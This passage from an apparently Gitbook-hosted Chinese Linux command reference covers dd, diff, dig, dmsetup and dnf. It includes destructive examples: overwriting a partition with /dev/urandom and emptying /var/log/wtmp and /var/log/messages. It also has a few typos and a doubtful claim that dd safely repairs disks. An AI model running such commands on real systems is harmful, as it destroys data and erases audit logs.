压缩备份恢复至指定盘3.5 备份与恢复MBR3.6 备份软盘3.7 拷贝内存内容到硬盘3.8 拷贝光盘内容到指定文件夹，并保存cd.iso3.9 增加swap分区文件大小3.10 销毁磁盘数据3.11 测试硬盘的读写速度3.12 修复硬盘3.13 利用netcat远程备份4. /dev/null和/dev/zeroLinux Command dd tagsstart 文件管理 tagsstop 1. 简介 Linux dd 命令用于读取、转换并输出数据。 dd 可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。 注意：指定数字的地方若以下列字符结尾，则乘以相应的数字：b=512；c=1；k=1024；w=2 2. 参数 参数说明: if=文件名：输入文件名，默认为标准输入。即指定源文件。 of=文件名：输出文件名，默认为标准输出。即指定目的文件。 ibs=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。 obs=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。 bs=bytes：同时设置读入/输出的块大小为bytes个字节。 cbs=bytes：一次转换bytes个字节，即指定转换缓冲区大小。 skip=blocks：从输入文件开头跳过blocks个块后再开始复制。 seek=blocks：从输出文件开头跳过blocks个块后再开始复制。 count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。 conv=，关键字可以有以下11种： conversion：用指定的参数转换文件。 ascii：转换ebcdic为ascii ebcdic：转换ascii为ebcdic ibm：转换ascii为alternate ebcdic block：把每一行转换为长度为cbs，不足部分用空格填充 unblock：使每一行的长度都为cbs，不足部分用空格填充 lcase：把大写字符转换为小写字符 ucase：把小写字符转换为大写字符 swap：交换输入的每对字节 noerror：出错时不停止 notrunc：不截短输出文件 sync：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。 --help：显示帮助信息 --version：显示版本信息 3. 举例 3.1 /dev/hdb备份至/dev/hdd $ dd if=/dev/hdb of=/dev/hdd 3.2 备份文件恢复至指定盘 $ dd if=/root/image of=/dev/hdb 3.3 备份/dev/hdb并gzip压缩 dd if=/dev/hdb | gzip > /root/image.gz 3.4 压缩备份恢复至指定盘 gzip -dc /root/image.gz | dd of=/dev/hdb 3.5 备份与恢复MBR 备份磁盘开始的512个字节大小的MBR信息到指定文件： $ dd if=/dev/hda of=/root/image count=1 bs=512 count=1指仅拷贝一个块； bs=512指块大小为512个字节。 恢复： #dd if=/root/image of=/dev/had 将备份的MBR信息写到磁盘开始部分 3.6 备份软盘 $ dd if=/dev/fd0 of=disk.img count=1 bs=1440k (即块大小为1.44M) 3.7 拷贝内存内容到硬盘 $ dd if=/dev/mem of=/root/mem.bin bs=1024 (指定块大小为1k) 3.8 拷贝光盘内容到指定文件夹，并保存cd.iso #dd if=/dev/cdrom(hdc) of=/root/cd.iso 3.9 增加swap分区文件大小 第一步：创建一个大小为256M的文件： $ dd if=/dev/zero of=/swapfile bs=1024 count=262144 第二步：把这个文件变成swap文件： $ mkswap /swapfile 第三步：启用这个swap文件： $ swapon /swapfile 第四步：编辑/etc/fstab文件，使在每次开机时自动加载swap文件： /swapfile swap swap default 0 0 3.10 销毁磁盘数据 $ dd if=/dev/urandom of=/dev/hda1 注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。 3.11 测试硬盘的读写速度 $ dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file $ dd if=/root/1Gb.file bs=64k | dd of=/dev/null 通过以上两个命令输出的命令执行时间，可以计算出硬盘的读、写速度。 确定硬盘的最佳块大小： $ dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file $ dd if=/dev/zero bs=2048 count=500000 of=/root/1Gb.file $ dd if=/dev/zero bs=4096 count=250000 of=/root/1Gb.file $ dd if=/dev/zero bs=8192 count=125000 of=/root/1Gb.file 通过比较以上命令输出中所显示的命令执行时间，即可确定系统最佳的块大小。 3.12 修复硬盘 $ dd if=/dev/sda of=/dev/sda 或dd if=/dev/hda of=/dev/hda 当硬盘较长时间(一年以上)放置不使用后，磁盘上会产生magnetic flux point，当磁头读到这些区域时会遇到困难，并可能导致I/O错误。当这种情况影响到硬盘的第一个扇区时，可能导致硬盘报废。上边的命令有可能使这些数 据起死回生。并且这个过程是安全、高效的。 3.13 利用netcat远程备份 $ dd if=/dev/hda bs=16065b | netcat 1234 在源主机上执行此命令备份/dev/hda $ netcat -l -p 1234 | dd of=/dev/hdc bs=16065b 在目的主机上执行此命令来接收数据并写入/dev/hdc $ netcat -l -p 1234 | bzip2 > partition.img $ netcat -l -p 1234 | gzip > partition.img 以上两条指令是目的主机指令的变化分别采用bzip2、gzip对数据进行压缩，并将备份文件保存在当前目录。 将一个很大的视频文件中的第i个字节的值改成0×41（也就是大写字母A的ASCII值） echo A | dd of=bigfile seek=$i bs=1 count=1 conv=notrunc 4. /dev/null和/dev/zero /dev/null，外号叫无底洞，你可以向它输出任何数据 /dev/zero，是一个输入设备，你可你用它来初始化文件。该设备无穷尽地提供0，可以使用任何你需要的数目——设备提供的要多的多。他可以用于向设备或文件写入字符串0。 $ if=/dev/zero of=./test.txt bs=1k count=1 $ ls –l total 4 -rw-r–r– 1 oracle dba 1024 Jul 15 16:56 test.txt $ find / -name access_log 2>/dev/null 禁止标准输出 $ cat $filename >/dev/null 禁止标准错误 $ rm $badname 2>/dev/null $ cat $filename &>/dev/null $ cat /dev/null > /var/log/messages $ cat /dev/null > /var/log/wtmp $: > /var/log/messages 有同样的效果， 但不会产生新的进程.（因为:是内建的） Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:07:53 "},"Linux-Command/Linux_Command_diff.html":{"url":"Linux-Command/Linux_Command_diff.html","title":"Linux Command Diff","keywords":"","body":"Linux Command diff 文件比较1. 简介2. 如何读懂3. 三种格式3.1 正常格式的diff3.2 上下文格式的diff3.3 合并格式的diff3.4 git格式的diffLinux Command diff 文件比较 tagsstart 文件管理 tagsstop 图 1.2.13.1：在这里插入图片描述 1. 简介 diff命令是比较两个版本不同的文件以找到改动的地方。 diff是svn、cvs、git等版本控制工具不可或缺的一部分。 语法： $ diff 2. 如何读懂 图 1.2.13.2：在这里插入图片描述 3. 三种格式 由于历史原因，diff有三种格式： 正常格式（normal diff） 上下文格式（context diff） 合并格式（unified diff） 第一个文件叫做f1，内容是每行一个a，一共7行。 a a a a a a a 第二个文件叫做f2，修改f1而成，第4行变成b，其他不变。 a a a b a a a 3.1 正常格式的diff 最早的Unix（即AT&T版本的Unix），使用的就是这种格式的diff 现在对f1和f2进行比较： $ diff f1 f2 4c4 #它分成三个部分：前面的\"4\"，表示f1的第4行有变化；\"c\"表示变动的模式是内容改变（change），其他模式还有\"增加\"（a，代表addition）和\"删除\"（d，代表deletion）；后面的\"4\"，表示变动后变成f2的第4行。 b #前面的大于号表示f2增加了该行，后面的\"b\"表示该行的内容。 3.2 上下文格式的diff 上个世纪80年代初，加州大学伯克利分校推出BSD版本的Unix时，觉得diff的显示结果太简单，最好加入上下文，便于了解发生的变动。因此，推出了上下文格式的diff。 它的使用方法是加入c参数（代表context）。 $ diff -c f1 f2 #第一部分的两行，显示两个文件的基本情况：文件名和时间信息 　　*** f1 2012-08-29 16:45:41.000000000 +0800 #\"***\"表示变动前的文件 　　--- f2 2012-08-29 16:45:51.000000000 +0800 #\"---\"表示变动后的文件 　　*************** #第二部分是15个星号，将文件的基本情况与变动内容分割开 　　*** 1,7 **** #第三部分显示变动前的文件，从第1行开始连续7行 　　 a 　　 a 　　 a #文件内容的每一行最前面，还有一个标记位: 　　!a #1. 如果是感叹号（!），表示该行有改动； 　　 a #2. 如果为空，表示该行无变化； 　　 a #3. 如果是减号（-），表示该行被删除； 　　 a #4. 如果是加号（+），表示该行为新增。 　　--- 1,7 ---- #总共显示7行 　　 a 　　 a 　　 a 　　!b 　　 a 　　 a 　　 a 3.3 合并格式的diff 如果两个文件相似度很高，那么上下文格式的diff，将显示大量重复的内容，很浪费空间。1990年，GNU diff率先推出了\"合并格式\"的diff，将f1和f2的上下文合并在一起显示。 它的使用方法是加入u参数（代表unified）。 $ diff -u f1 f2 　　--- f1 2012-08-29 16:45:41.000000000 +0800 #\"---\"表示变动前的文件 　　+++ f2 2012-08-29 16:45:51.000000000 +0800 #\"+++\"表示变动后的文件 　　@@ -1,7 +1,7 @@ #两个@作为起首和结束,减号表示第一个文件即f1，加号表示第二个文件即f2 　　 a 　　 a 　　 a #每一行最前面的标志位，空表示无变动 　　-a #减号表示第一个文件删除的行 　　+b #加号表示第二个文件新增的行。 　　 a 　　 a 　　 a 除了有变动的那些行以外，也是上下文各显示3行。它将两个文件的上下文，合并显示在一起，所以叫做\"合并格式\"。 3.4 git格式的diff 版本管理系统git，使用的是合并格式diff的变体。 　$ git diff 　　diff --git a/f1 b/f1 #a版本的f1（即变动前）和b版本的f1（即变动后） 　　index 6f8a38c..449b072 100644 #表示两个版本的git哈希值（index区域的6f8a38c对象，与工作目录区域的449b072对象进行比较），最后的六位数字是对象的模式（普通文件，644权限）。 　　--- a/f1 #\"---\"表示变动前的版本 　　+++ b/f1 #\"+++\"表示变动后的版本 　　@@ -1,7 +1,7 @@ #后面的行都与官方的合并格式diff相同 　　 a 　　 a 　　 a 　　-a 　　+b 　　 a 　　 a 　　 a 更多阅读： 读懂diff Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:15:17 "},"Linux-Command/Linux_Command_dig.html":{"url":"Linux-Command/Linux_Command_dig.html","title":"Linux Command Dig","keywords":"","body":"Linux Command dig 查询DNS1. 简介2. 组成3. 实例Linux Command dig 查询DNS 1. 简介 dig，和nslookup作用有些类似，都是DNS查询工具 什么是CNAME：一个域名可以有两种类型的指向，如果一个 域名指向 称为一个 记录 （Record）的话，那么就有两种 记录类型 （Record Type），分别是： A记录 ：指向一个IP地址 CNAME ：指向一个其他的域名 2. 组成 输出结果大致分成4个部分，实际上可能还包括更多的内容，总共会有以下6个部分： Header : 包括软件版本，全局变量以及除消息头以外的其他部分的信息，比如上例中，显示有1个QUERY，2个ANSWER QUESTION SECTION : 请求参数信息，也就是你的输入 ANSWER SECTION : 从DNS查询到的信息，也就是输出，显示 i.zhouliang.pro 是CNAME，指向 mydomain.lofter.com ，而后者是一个A记录，指向一个IP地址 AUTHORITY SECTION : 包含DNS域名服务器的授权信息，上例中不包含这一部分，如果用这个命令就可以看到 dig @ns1.redhat.com redhat.com ，这里的 @ 符号用于指定查询所使用的DNS服务器 ADDITIONAL SECTION : 包含AUTHORITY SECTION中的域名服务器的IP地址，同样，上例中也不包含这一部分 Stats section : 最下方的一部分，显示了查询时间等额外信息 如果你设置的dnsserver是一个域名，那么dig会首先通过默认的上连DNS服务器去查询对应的IP地址，然后再以设置的dnsserver为上连DNS服务器。 没有设置@dnsserver，那么dig就会依次使用/etc/resolv.conf里的地址作为上连DNS服务器。 对querytype有所了解，你可以设置A/AAAA/PTR/MX/ANY等值，默认是查询A记录。 +nocomments – 不显示注释 +noauthority – 不显示AUTHORITY SECTION +noadditional – 不显示ADDITIONAL SECTION +nostats – 不显示Stats section +noanswer – 不显示ANSWER SECTION +noall - 不显示所有的信息，一般会这样用 dig zhouliang.pro +noall +answer 和上面参数对应还有 +comments ， +answer 等，后文有示例，此处不赘述。另外，还有如下两个参数需要了解： +short - 显示简短的信息 -t 指定查询的记录类型，可以是CNAME、A、MX、NS，分别表示CNAME、A记录、MX记录、DNS服务器，默认是A -x 表示反向查找，也就是根据IP地址查找域名 -c 可以设置协议类型（class），包括IN(默认)、CH和HS -f dig支持从一个文件里读取内容进行批量查询 -4和-6 用于设置仅适用哪一种作为查询包传输协议，分别对应着IPv4和IPv6 -q 显式设置你要查询的域名 3. 实例 $ dig www.oolec.com 即查询域名的A记录，查询的dns服务器将采用系统配置的服务器，即/etc/resovle.conf 中的。 如果要查询其他类型的记录，比如MX，CNAME，NS，PTR等，只需将类型加在命令后面即可 $ dig www.oolec.com mx $ dig www.oolec.com ns 此外，如果你是一个系统管理员，部署好了一台dns服务器之后想对它进行解析测试，就必须要显式指定待测试的dns服务器地址了，例如 dig @202.106.0.20 www.oolec.com a 默认情况下dig将采用udp协议进行查询，如果要采用tcp方式，可以加上 +tcp参数 dig www.oolec.com a +tcp 另外一个重要的功能是+trace参数，使用这个参数之后将显示从根域逐级查询的过程 dig www.oolec.com a +trace google-DNS来查baidu.com的A记录 dig @8.8.8.8 www.baidu.com A //命令格式为dig @dnsserver name querytype $ cat querylist www.baidu.com www.sohu.com $ dig -f querylist -c IN -t A .查看域名 $ dig i.zhouliang.pro +noall +anwser ; > DiG 9.8.3-P1 > i.zhouliang.pro +noall +answer ;; global options: +cmd i.zhouliang.pro. 10034 IN CNAME mydomain.lofter.com. mydomain.lofter.com. 9183 IN A 54.248.125.234 第一行是CNAME，先将 i.zhouliang.pro 解析成 mydomain.lofter.com ，第二行是A记录，将 mydomain.lofter.com 解析成IP地址。这是一个完整的域名解析过程 2.查找域名的MX记录： $ dig zhouliang.pro -t MX +short 10 mxdomain.qq.com. 从输出可以看出，我用了QQ提供的域名邮箱服务 3.查找域名对应的CNAME： $ dig i.zhouliang.pro -t CNAME +short mydomain.lofter.com. 4.根据IP地址反向查找域名 $ dig -x 8.8.8.8 +short ; > DiG 9.8.3-P1 > -x 8.8.8.8 +noall +answer ;; global options: +cmd 8.8.8.8.in-addr.arpa. 79605 IN PTR google-public-dns-a.google.com. 5.查询域名的解析DNS服务器地址 $ dig www. ns +short 参考： How to Use Linux dig Command (DNS Lookup) Dig Command in Linux (DNS Lookup) dig(1) - Linux man page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:09:16 "},"Linux-Command/Linux_Command_dmsetup.html":{"url":"Linux-Command/Linux_Command_dmsetup.html","title":"Linux Command Dmsetup","keywords":"","body":"Linux Command dmsetup管理LVM1. 简介2. 语法3. 命令3.1 常用命令3.2 dmsetup info3.3 dmsetup ls3.4 dmsetup status3.5 dmsetup deps3.6 dmsetup table3.7 dmsetup createLinux Command dmsetup管理LVM tagsstart 设备管理 tagsstop 1. 简介 dmsetup 命令是一个用来与 Device Mapper 沟通的命令行封装器（wrapper）。可使用 dmsetup 命令的 info、ls、status 和 deps 选项查看 LVM 设备的常规信息，如以下小节所述。 2. 语法 dmsetup + + or # command 常见的有 remove 、 ls 、status 等 # device_name: 可以是/dev/sd*，或者是物理卷的名称 3. 命令 3.1 常用命令 dmsetup clear device_name dmsetup create device_name [-u|--uuid uuid] [--addnodeoncreate|--addnodeonresume] [-n|--notable|--table table|table_file] [--readahead [+]sectors|auto|none] dmsetup create --concise [concise_device_specification] dmsetup deps [-o options] [device_name...] dmsetup help [-c|-C|--columns] dmsetup info [device_name...] dmsetup info -c|-C|--columns [--count count] [--interval seconds] [--nameprefixes] [--noheadings] [-o fields] [-O|--sort sort_fields] [--separator separator] [device_name] dmsetup load device_name [--table table|table_file] dmsetup ls [--target target_type] [--exec command] [--tree] [-o options] dmsetup mangle [device_name...] dmsetup message device_name sector message dmsetup mknodes [device_name...] dmsetup reload device_name [--table table|table_file] dmsetup remove [-f|--force] [--retry] [--deferred] device_name... dmsetup remove_all [-f|--force] [--deferred] dmsetup rename device_name new_name dmsetup rename device_name --setuuid uuid dmsetup resume device_name... [--addnodeoncreate|--addnodeonresume] [--noflush] [--nolockfs] [--readahead [+]sectors|auto|none] dmsetup setgeometry device_name cyl head sect start dmsetup splitname device_name [subsystem] dmsetup stats command [options] dmsetup status [--target target_type] [--noflush] [device_name...] dmsetup suspend [--nolockfs] [--noflush] device_name... dmsetup table [--concise] [--target target_type] [--showkeys] [device_name...] dmsetup targets dmsetup udevcomplete cookie dmsetup udevcomplete_all [age_in_minutes] dmsetup udevcookie dmsetup udevcreatecookie dmsetup udevflags cookie dmsetup udevreleasecookie [cookie] dmsetup version dmsetup wait [--noflush] device_name [event_nr] dmsetup wipe_table device_name... [-f|--force] [--noflush] [--nolockfs] devmap_name major minor devmap_name major:minor 3.2 dmsetup info # dmsetup info Name: testgfsvg-testgfslv1 State: ACTIVE Read Ahead: 256 Tables present: LIVE Open count: 0 Event number: 0 Major, minor: 253, 2 Number of targets: 2 UUID: LVM-K528WUGQgPadNXYcFrrf9LnPlUMswgkCkpgPIgYzSvigM7SfeWCypddNSWtNzc2N ... Name: VolGroup00-LogVol00 State: ACTIVE Read Ahead: 256 Tables present: LIVE Open count: 1 Event number: 0 Major, minor: 253, 0 Number of targets: 1 UUID: LVM-tOcS1kqFV9drb0X1Vr8sxeYP0tqcrpdegyqj5lZxe45JMGlmvtqLmbLpBcenh2L3 dmsetup info 命令提供以下分类信息： Name 设备名称。LVM 设备以用小横线分隔的卷组名称和逻辑卷名称表示。在源名称中小横线会转换为两个小横线。在标准 LVM 操作过程中，不应使用这种格式的 LVM 设备名称直接指定 LVM 设备，而是应该使用 vg/lv 指定。 State 可能的设备状态是 SUSPENDED、ACTIVE 和 READ-ONLY。dmsetup suspend 命令将设备状态设定为 SUSPENDED。当挂起某个设备时，会停止对该设备的所有 I/O 操作。使用 dmsetup resume 命令可将设备状态恢复到 ACTIVE。 Read Ahead 系统对正在进行读取操作的任意打开文件的预读数据块数目。默认情况下，内核会自动选择一个合适的值。可使用 dmsetup 命令的 --readahead 选项更改这个值。 Tables present 这个类型的可能状态为 LIVE 和 INACTIVE。INACTIVE 状态表示已经载入了表格，且会在 dmsetup resume 命令将某个设备状态恢复为 ACTIVE 时进行切换，届时表格状态将为 LIVE。有关详情请参考 dmsetup man page。 Open count 打开参考计数表示打开该设备的次数。mount 命令会打开一个设备。 Event number 目前收到的事件数目。使用 dmsetup wait n 命令允许用户等待第 n 个事件，收到该事件前阻断该调用。 Major, minor 主设备号码和副设备号码 Number of targets 组成某个设备的片段数目。例如：一个跨三个磁盘的线性设备会有三个目标。线性设备由某个磁盘起始和结尾，而不是中间组成的线性设备有两个目标。 UUID 该设备的 UUID。 3.3 dmsetup ls 可以使用 dmsetup ls 命令列出映射的设备的设备名称列表。可以使用 dmsetup ls --target target_type 命令列出至少有一个指定类型目标的设备。有关 dmsetup ls 的其他选项 # dmsetup ls testgfsvg-testgfslv3 (253:4) testgfsvg-testgfslv2 (253:3) testgfsvg-testgfslv1 (253:2) VolGroup00-LogVol01 (253:1) VolGroup00-LogVol00 (253:0) # dmsetup ls --target mirror lock_stress-grant--02.1722 (253, 34) lock_stress-grant--01.1720 (253, 18) lock_stress-grant--03.1718 (253, 52) lock_stress-grant--02.1716 (253, 40) lock_stress-grant--03.1713 (253, 47) lock_stress-grant--02.1709 (253, 23) lock_stress-grant--01.1707 (253, 8) lock_stress-grant--01.1724 (253, 14) lock_stress-grant--03.1711 (253, 27) 在多路径或者其它 device mapper 装置中堆叠的 LVM 配置文件可能过于复杂。dmsetup ls 命令提供了一个--tree 选项，可以树形式显示设备间的相依性，如下所示。 # dmsetup ls --tree vgtest-lvmir (253:13) ├─vgtest-lvmir_mimage_1 (253:12) │ └─mpathep1 (253:8) │ └─mpathe (253:5) │ ├─ (8:112) │ └─ (8:64) ├─vgtest-lvmir_mimage_0 (253:11) │ └─mpathcp1 (253:3) │ └─mpathc (253:2) │ ├─ (8:32) │ └─ (8:16) └─vgtest-lvmir_mlog (253:4) └─mpathfp1 (253:10) └─mpathf (253:6) ├─ (8:128) └─ (8:80) 3.4 dmsetup status dmsetup status device 命令提供指定设备中每个目标的状态信息。如果没有指定设备名称，输出结果是所有目前配置的设备映射器设备信息。可以使用 dmsetup status --target target_type 命令列出那些至少有一个指定类型目标的设备。 # dmsetup status testgfsvg-testgfslv3: 0 312352768 linear testgfsvg-testgfslv2: 0 312352768 linear testgfsvg-testgfslv1: 0 312352768 linear testgfsvg-testgfslv1: 312352768 50331648 linear VolGroup00-LogVol01: 0 4063232 linear VolGroup00-LogVol00: 0 151912448 linear 3.5 dmsetup deps dmsetup deps device 命令为指定设备的映射列表参考的设备提供（major，minor）对列表。如果没有指定设备名称，则输出所有目前配置的设备映射器设备信息。 # dmsetup deps testgfsvg-testgfslv3: 1 dependencies : (8, 16) testgfsvg-testgfslv2: 1 dependencies : (8, 16) testgfsvg-testgfslv1: 1 dependencies : (8, 16) VolGroup00-LogVol01: 1 dependencies : (8, 2) VolGroup00-LogVol00: 1 dependencies : (8, 2) # dmsetup deps lock_stress-grant--02.1722 3 dependencies : (253, 33) (253, 32) (253, 31) 3.6 dmsetup table 显示table信息 # dmsetup table docker-253:2-8409152-pool: 0 419430400 thin-pool 7:1 7:0 128 32768 1 skip_block_zeroing docker-docker--lv: 0 16777216 linear 8:16 2048 centos-swap: 0 4194304 linear 8:2 2048 centos-root: 0 98549760 linear 8:2 4196352 3.7 dmsetup create dmsetup create dm-name dm-table dm-name是要创建的设备名字。 如果成功将会在/dev/mapper/目录下 生成这个名字的文件 dm-table是保存了这个map device的 mapping table。 起始扇区 扇区个数 线性映射 目标设备 目标设备上的起始扇区 0 1025 linear /dev/sdb2 0 1025 1025 linear /dev/sdc2 0 某个block的sector大小，可以用 blockdev --getsize /dev/sdb2来得到。 如果是刚分区的盘，需要用partprobe来更新一下。 查看linear设备的写入顺序 将新生成的设备创建文件系统，mount到某个目录。 cd到这个目录下，运行 dd if=/dev/zero of=test 这个命令将一直运行到写满磁盘。 在运行之前可以运行 watch -n 1 iostat /dev/sdb2 /dev/sdc2 来观察磁盘的读写情况。 可以发现 写入的过程是，先写入到/dev/sdb2，再写入到/dev/sdc2. 这个过程是和linear的概念一致的。 [root@node1 ~]# blockdev --getsize /dev/sdc1 1012032 [root@node1 ~]# blockdev --getsize /dev/sdd1 1012032 [root@node1 ~]# vi linear_table 0 1012032 linear /dev/sdc1 0 1012032 1012032 linear /dev/sdd1 0 [root@node1 ~]# dmsetup create linear_test linear_table [root@node1 ~]# ls -l /dev/mapper/linear_test brw-rw---- 1 root disk 253, 0 Jan 4 10:39 /dev/mapper/linear_test 更多阅读： dmsetup 命令 dmsetup(8) — Linux manual page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_dnf.html":{"url":"Linux-Command/Linux_Command_dnf.html","title":"Linux Command Dnf","keywords":"","body":"Linux Command dnf 软件包管理1. 简介2. 语法3. 安装4. 示例4.1 查看DNF版本4.2 列出启用的 DNF 存储库4.3 列出所有启用和禁用的 DNF 存储库4.4 使用 DNF 列出所有可用和已安装的软件包4.5 使用 DNF 列出所有已安装的软件包4.6 使用 DNF 列出特定的包4.7 使用 DNF 列出所有可用的包4.8 使用 DNF 搜索包4.9 看看提供了什么文件/子包？4.10 使用 DNF 获取包的详细信息4.11 使用 DNF 安装包4.12 使用 DNF 更新包4.13 使用 DNF 检查系统更新4.14 使用 DNF 更新所有系统包4.15 使用 DNF升级特定的包4.16 使用 DNF 删除/擦除包4.17 使用 DNF 删除孤立包4.18 使用 DNF 删除缓存包4.19 获取特定 DNF 命令的帮助4.20 列出所有 DNF 命令和选项4.21 查看DNF的历史4.22 列出所有组包4.23 列出组包中有哪些包4.24 使用 DNF 安装组包4.25 更新组包4.26 删除组包4.27 从特定存储库安装包4.28 将已安装的包同步到稳定版本4.29 重新安装一个包4.30 降级软件包5. DNF 源5.1 配置main部分5.2 配置repository部分5.3 显示当前配置5.4 创建本地软件源仓库5.5 添加软件源5.6 启用软件源5.7 禁用软件源6. 结论Linux Command dnf 软件包管理 tagsstart 软件包管理 tagsstop 图 1.2.16.1：在这里插入图片描述 1. 简介 DNF 命令(Dandified yum) 是基于 RedHat 的系统的传统YUM 包管理器的下一代版本。它是 Fedora 22、CentOS8 和 RHEL8 的默认包管理器。它旨在替代 YUM。它使用 RPM 和libsolv（由 OpenSUSE 维护）进行包管理。 DNF旨在改善YUM的瓶颈，即性能、内存使用、依赖解决、速度和许多其他因素。DNF 使用 RPM、libsolv 和 hawkey 库进行包管理。虽然它没有在 CentOS 和 RHEL 7 中单独安装，但您可以 yum、dnf 并与 yum 一起使用它。 DNF的最新稳定版本是2015 年5 月 11 日发布的1.0（在撰写本文时）。它（以及所有以前的 DNF 版本）主要是用 Python 编写的，并在 GPL v2 许可下发布。 2. 语法 dnf [options] [...] 可用的命令包括install, search, query等。 args可以是特定于“命令”的包名、组名或子命令。 注意：要安装和删除软件包，您需要具有sudo 权限。由于我已经是 root（这不是一个好主意，但用于演示目的），我不会在任何命令前添加sudo。但请记住，在安装和删除软件包时必须预先添加 sudo。 3. 安装 DNF 在RHEL / CentOS 7的默认存储库中不可用。然而，Fedora 22 附带了正式实施的 DNF。 要在RHEL/CentOS系统上安装DNF，您需要首先安装并启用epel-release存储库。 # yum install epel-release OR # yum install epel-release -y # yum install dnf 4. 示例 4.1 查看DNF版本 # dnf --version 4.2 列出启用的 DNF 存储库 # dnf repolist 4.3 列出所有启用和禁用的 DNF 存储库 # dnf repolist all 4.4 使用 DNF 列出所有可用和已安装的软件包 # dnf list 4.5 使用 DNF 列出所有已安装的软件包 # dnf list installed 4.6 使用 DNF 列出特定的包 dnf list installed | grep bash 4.7 使用 DNF 列出所有可用的包 # dnf list available 4.8 使用 DNF 搜索包 如果万一，您不知道要安装的软件包，在这种情况下，您可以使用带有 dnf 命令的“搜索”选项来搜索与单词或字符串匹配的软件包（比如 nano）。 # dnf search nano 4.9 看看提供了什么文件/子包？ dnf 选项“提供”查找提供特定文件/子包的包的名称。例如，如果您想查找系统上提供“ /bin/bash ”的内容？ # dnf provides /bin/bash 4.10 使用 DNF 获取包的详细信息 假设你想在系统上安装一个包之前知道它的信息，你可以使用“ info ”开关来获取一个包的详细信息（比如 nano），如下所示。 # dnf info nano 4.11 使用 DNF 安装包 # dnf install nano 4.12 使用 DNF 更新包 你可以只更新一个特定的包（比如systemd）并且不改变系统上的所有内容。 # dnf update systemd 4.13 使用 DNF 检查系统更新 # dnf check-update 4.14 使用 DNF 更新所有系统包 您可以使用以下命令更新整个系统，包括所有已安装的软件包。 # dnf update OR # dnf upgrade 4.15 使用 DNF升级特定的包 dnf upgrade python3-perf 4.16 使用 DNF 删除/擦除包 要删除或擦除任何不需要的包（例如nano），您可以使用带有 dnf 命令的“ remove ”或“ erase ”开关来删除它。 # dnf remove nano OR # dnf erase nano 4.17 使用 DNF 删除孤立包 那些为了满足依赖而安装的包如果不被其他应用程序使用，可能会毫无用处。要删除这些孤立包，请执行以下命令。 # dnf autoremove 4.18 使用 DNF 删除缓存包 很多时候，我们遇到过时的标头和未完成的事务，这会在执行 dnf 时导致错误。我们可以简单地通过执行来清除所有缓存的包和包含远程包信息的标头。 # dnf clean all 4.19 获取特定 DNF 命令的帮助 # dnf help clean 4.20 列出所有 DNF 命令和选项 # dnf help 4.21 查看DNF的历史 您可以调用 dnf history 查看已执行的 dnf 命令列表。通过这种方式，您可以通过时间戳了解安装/删除的内容。 # dnf history 4.22 列出所有组包 命令“ dnf grouplist ”将打印所有可用或已安装的软件包，如果没有提及，它将列出所有已知的组。 # dnf grouplist 4.23 列出组包中有哪些包 dnf group info \"Development Tools\" 4.24 使用 DNF 安装组包 # dnf groupinstall 'Educational Software' 4.25 更新组包 # dnf groupupdate 'Educational Software' 4.26 删除组包 # dnf groupremove 'Educational Software' 4.27 从特定存储库安装包 DNF 使得从 repo ( epel ) 安装任何特定的包 (比如phpmyadmin ) 成为可能，就像， # dnf --enablerepo=epel install phpmyadmin 4.28 将已安装的包同步到稳定版本 命令“ dnf distro-sync ”将提供必要的选项，以将所有已安装的软件包同步到任何启用的存储库中可用的最新稳定版本。如果未选择任何包，则同步所有已安装的包。 # dnf distro-sync 4.29 重新安装一个包 # dnf reinstall nano 4.30 降级软件包 如果可能，选项“downgrade”会将命名包（比如 acpid）降级到较低版本。 # dnf downgrade acpid 5. DNF 源 DNF 的主要配置文件是 /etc/dnf/dnf.conf，该文件包含两部分： “main”部分保存着DNF的全局设置。 “repository”部分保存着软件源的设置，可以有一个或多个“repository”。 另外，在/etc/yum.repos.d 目录中保存着一个或多个repo源相关文件，它们也可以定义不同的“repository” 5.1 配置main部分 /etc/dnf/dnf.conf 文件包含的“main”部分，配置示例如下： [main] gpgcheck=1 installonly_limit=3 clean_requirements_on_remove=True best=True 常用选项说明： 参数 说明 cachedir 缓存目录，该目录用于存储RPM包和数据库文件。 keepcache 可选值是1和0，表示是否要缓存已安装成功的那些RPM包及头文件，默认值为0，即不缓存。 debuglevel 设置dnf生成的debug信息。取值范围：[0-10]，数值越大会输出越详细的debug信息。默认值为2，设置为0表示不输出debug信息。 clean_requirements_on_remove 删除在dnf remove期间不再使用的依赖项，如果软件包是通过DNF安装的，而不是通过显式用户请求安装的，则只能通过clean_requirements_on_remove删除软件包，即它是作为依赖项引入的。 默认值为True。 best 升级包时，总是尝试安装其最高版本，如果最高版本无法安装，则提示无法安装的原因并停止安装。默认值为True。 obsoletes 可选值1和0，设置是否允许更新陈旧的RPM包。默认值为1，表示允许更新。 gpgcheck 可选值1和0，设置是否进行gpg校验。默认值为1，表示需要进行校验。 plugins 可选值1和0，表示启用或禁用dnf插件。默认值为1，表示启用dnf插件。 installonly_limit 设置可以同时安装“installonlypkgs”指令列出包的数量。默认值为3，不建议降低此值。 5.2 配置repository部分 repository部分允许您定义定制化的openEuler软件源仓库，各个仓库的名称不能相同，否则会引起冲突。配置repository部分有两种方式，一种是直接配置/etc/dnf/dnf.conf文件中的“repository”部分，另外一种是配置/etc/yum.repos.d目录下的.repo文件。 直接配置/etc/dnf/dnf.conf文件中的“repository”部分 下面是[repository]部分的一个最小配置示例： [repository] name=repository_name baseurl=repository_url openEuler提供在线的镜像源，地址：https://repo.openeuler.org/。以 openEuler 20.09的aarch64版本为例，baseurl可配置为https://repo.openeuler.org/openEuler-20.09/OS/aarch64/。 表 2 repository参数说明 |参数| 说明| |--|--| 